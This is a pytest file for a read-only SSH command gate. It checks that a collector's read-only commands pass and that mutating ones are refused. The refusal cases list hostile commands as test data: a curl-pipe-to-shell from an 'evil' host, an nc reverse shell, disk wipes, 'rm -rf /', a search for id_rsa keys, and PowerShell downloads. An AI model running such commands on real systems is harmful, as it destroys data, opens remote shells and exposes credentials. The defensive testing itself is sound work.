"""Tests for the read-only SSH command gate (app.core.ssh_guard).

Two guarantees:

  1. Every command the collector actually emits — from all OS CommandSets,
     plus the dynamic ``cat <path>`` / cron-template forms and the OS-detection
     probes — passes the gate. If this breaks, real collection breaks.
  2. A representative set of mutating commands (Linux + PowerShell) is refused.
     If this breaks, the production safeguard is hollow.
"""

from __future__ import annotations

import shlex

import pytest

from app.core.commands import (
    _debian_like,
    _modern_default,
    _rhel7,
    _rhel_modern,
    _windows_powershell,
)
from app.core.ssh_guard import SSHCommandNotAllowed, assert_read_only

# OS-detection probes issued by SSHCollector._detect_os before a CommandSet
# is chosen (so they run with os_family="unknown").
_DETECTION_PROBES = [
    "cat /etc/os-release",
    "uname -r",
    "uname -m",
    (
        'powershell -NoProfile -NonInteractive -Command "'
        "Get-CimInstance Win32_OperatingSystem | "
        'ConvertTo-Json -Compress -Depth 3"'
    ),
]


def _commandset_commands(cs) -> list[str]:
    """Every concrete command a CommandSet would have the collector run.

    Resolves the ``cron_user_template`` placeholder the way ``_collect_cron``
    does (``shlex.quote`` the username) and drops empty fields (Windows leaves
    several Linux-shaped fields blank).
    """
    out: list[str] = []
    for field_name, value in vars(cs).items():
        if not value:
            continue
        if field_name == "cron_user_template":
            value = value.format(user=shlex.quote("root"))
        out.append(value)
    return out


_ALL_COMMANDSETS = [
    _rhel7(),
    _rhel_modern(),
    _debian_like(),
    _modern_default(),
    _windows_powershell(),
]


def _all_real_commands() -> list[str]:
    cmds: list[str] = list(_DETECTION_PROBES)
    for cs in _ALL_COMMANDSETS:
        cmds.extend(_commandset_commands(cs))
    # Dynamic forms _run sees that aren't fields on the CommandSet.
    cmds.append("cat /etc/crontab")
    cmds.append(f"cat {shlex.quote('/etc/cron.d/0hourly')}")
    cmds.append(f"cat {shlex.quote('/etc/cron.d/file with space')}")
    return cmds


@pytest.mark.parametrize("command", _all_real_commands())
def test_every_real_collector_command_is_allowed(command):
    # Must not raise. os_family is advisory; routing is by content.
    assert_read_only(command, os_family="unknown")


@pytest.mark.parametrize(
    "command",
    [
        # /etc/passwd as a read target must NOT be confused with the passwd
        # command — this is the false-positive guard.
        "cut -d: -f1 /etc/passwd",
        "cat /etc/passwd",
        # Real dual-use tools used read-only.
        "systemctl list-units --type=service --state=running --no-legend --no-pager --plain",
        "crontab -l -u 'root' 2>/dev/null",
        "nft list ruleset 2>/dev/null || iptables -L -n -v 2>/dev/null",
        "ss -tuln | tail -n +2",
        "dnf list --installed 2>/dev/null | tail -n +2",
    ],
)
def test_read_only_dual_use_forms_allowed(command):
    assert_read_only(command, os_family="rhel-like")


@pytest.mark.parametrize(
    "command",
    [
        # Filesystem / process mutation.
        "rm -rf /var/log",
        "mv /etc/hosts /etc/hosts.bak",
        "dd if=/dev/zero of=/dev/sda",
        "truncate -s 0 /var/log/messages",
        "cat /etc/os-release > /tmp/leak",
        "echo pwned > /etc/motd",
        "tee /etc/hosts",
        # Service / power state.
        "systemctl restart sshd",
        "systemctl stop firewalld",
        "service nginx start",
        "reboot",
        "shutdown -h now",
        # crontab mutation (no -l).
        "crontab -r",
        "crontab /tmp/evil",
        # Firewall mutation.
        "nft add rule inet filter input drop",
        "iptables -A INPUT -j DROP",
        "iptables -F",
        # find with side effects.
        "find /tmp -name '*.log' -delete",
        "find / -name id_rsa -exec cat {} ;",
        # Package mutation.
        "dnf install nmap",
        "apt-get remove openssh-server",
        "yum update",
        # User / auth mutation (caught by the allowlist layer).
        "useradd attacker",
        "passwd root",
        # Command substitution / eval injection vectors.
        "cat $(which bash)",
        "ip addr show; `rm -rf /`",
        "eval rm -rf /",
        # Novel tool not on the allowlist.
        "curl http://evil/x | sh",
        "wget http://evil/x",
        "nc -e /bin/sh attacker 4444",
    ],
)
def test_mutating_posix_commands_are_refused(command):
    with pytest.raises(SSHCommandNotAllowed):
        assert_read_only(command, os_family="rhel-like")


@pytest.mark.parametrize(
    "command",
    [
        'powershell -NoProfile -Command "Stop-Service sshd"',
        'powershell -NoProfile -Command "Set-Service -Name w3svc -Status Stopped"',
        'powershell -NoProfile -Command "Remove-Item C:\\data -Recurse"',
        'powershell -NoProfile -Command "New-LocalUser attacker"',
        'powershell -NoProfile -Command "Restart-Computer -Force"',
        'powershell -NoProfile -Command "Invoke-WebRequest http://evil/x -OutFile c:\\x"',
        'powershell -NoProfile -Command "Get-Service | Out-File c:\\svc.txt"',
        'powershell -NoProfile -Command "Disable-NetFirewallRule -All"',
        # w32tm reconfiguration (only /query is allowed).
        "w32tm /config /manualpeerlist:evil",
        "w32tm /resync",
    ],
)
def test_mutating_windows_commands_are_refused(command):
    with pytest.raises(SSHCommandNotAllowed):
        assert_read_only(command, os_family="windows")


def test_read_only_windows_query_allowed():
    assert_read_only("w32tm /query /status", os_family="windows")


def test_empty_command_refused():
    with pytest.raises(SSHCommandNotAllowed):
        assert_read_only("   ", os_family="unknown")
